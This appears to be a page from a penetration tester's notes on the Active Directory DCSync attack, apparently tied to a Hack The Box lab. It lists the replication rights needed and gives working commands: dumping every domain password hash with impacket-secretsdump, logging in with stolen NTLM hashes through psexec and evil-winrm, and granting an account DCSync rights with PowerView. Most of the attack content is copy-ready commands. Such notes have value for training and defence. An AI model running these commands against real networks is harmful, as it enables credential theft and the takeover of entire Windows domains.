---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# DCSync

DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos `krbtgt` keys used legitimately for tickets creation, but also for tickets forging by attackers.

{% hint style="info" %}
#### Required Privileges

This attack requires domain admin privileges to succeed (more specifically, it needs the following extended privileges:&#x20;

`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.&#x20;

Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default.

In some cases, over-privileged accounts can be abused to grant controlled objects the right to DCSync
{% endhint %}

***

## Using Impacket

### Prerequisites

To successfully execute a DCSync, the compromised account must have these specific Extended Rights on the Domain Object:

`DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)

`DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

### Dumping Hashes

[impacket](../../../toolbox/tooling/post-exploitation/impacket/ "mention") [secretsdump.md](../../../toolbox/tooling/post-exploitation/impacket/secretsdump.md "mention") uses the Directory Replication Service (DRS) Remote Protocol to ask the Domain Controller for account data.

To dump all domain hashes:

```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>
```

To dump a specific user and avoid noise:

```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user Administrator
```

Other flags:

Only extract data for a specific user: `-just-dc-user`

Only dump NTLM hashes (skips Kerberos keys): `-just-dc-ntlm`

Dumps password history (useful if the user reuses passwords): `-history`

Checks if accounts are disabled or expired: `-user-status`

### Post-Exploitation

Once we have the NTLM hash (the string after the `:`) for a user, we don't need to crack it. We can use it to log in directly via `impacket-psexec` or `evil-winrm`.

Using [impacket](../../../toolbox/tooling/post-exploitation/impacket/ "mention") [psexec.md](../../../toolbox/tooling/post-exploitation/psexec.md "mention"):

```bash
impacket-psexec <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -hashes :<NTLM_HASH>
```

Using [evil-winrm.md](../../../toolbox/tooling/post-exploitation/evil-winrm.md "mention"):

```bash
evil-winrm -i <DC_IP> -u <USER> -H <NTLM_HASH>
```

***

## Granting Replication Rights

If we have `WriteDACL` (or `GenericAll`) over the Domain object, we can manually grant a user the rights required for a DCSync attack.

### PowerView

We can run the required [powerview.md](../../../toolbox/tooling/post-exploitation/powerview.md "mention") commands from an [evil-winrm.md](../../../toolbox/tooling/post-exploitation/evil-winrm.md "mention") or PowerShell session on the target machine.

#### Import PowerView

Import the [powerview.md](../../../toolbox/tooling/post-exploitation/powerview.md "mention") module:

```powershell
. .\PowerView.ps1
```

```powershell
Import-Module .\PowerView.ps1
```

#### Grant Privileges

Grant the DCSync rights to the user:

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "svc-alfresco" -Rights DCSync -Verbose
```
{% endcode %}

{% hint style="info" %}
#### Note

The `-Rights DCSync` flag in modern [powerview.md](../../../toolbox/tooling/post-exploitation/powerview.md "mention") is a "helper" that automatically adds both necessary extended rights: `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.
{% endhint %}

#### Verify the Privileges

After running the command, verify that the Ace (Access Control Entry) was successfully added to the domain's DACL.

{% code overflow="wrap" %}
```powershell
Get-DomainObjectAcl -Identity "DC=htb,DC=local" -ResolveGUIDs | Where-Object {($_.IdentityReference -match "svc-alfresco") -and ($_.ActiveDirectoryRights -match "ExtendedRight")}
```
{% endcode %}

#### Execute the Attack

Once verified, try [#using-impacket](dcsync.md#using-impacket "mention") to perform the attack.
